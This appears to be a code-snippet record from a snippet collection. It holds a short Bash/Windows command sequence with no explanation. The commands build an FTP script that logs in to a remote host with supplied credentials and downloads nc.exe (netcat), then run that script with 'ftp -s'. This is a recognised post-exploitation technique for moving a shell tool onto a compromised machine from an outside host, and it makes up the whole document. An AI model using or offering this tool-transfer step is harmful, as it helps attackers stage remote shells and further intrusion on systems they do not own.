---
id: 3a2b2a31-7b72-4006-8e8b-3d8bc0745a50
type: code
language: Bash
verified: false
created_at: '2020-07-14T18:14:34.741324+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 3a2b2a31

**Language**: Bash

```bash

echo open $ip 21 > ftp.txt
echo $user >> ftp.txt
echo $pass >> ftp.txt
echo binary >> ftp.txt
echo GET nc.exe >> ftp.txt
echo bye >> ftp.txt
ftp -s:ftp.txt

```
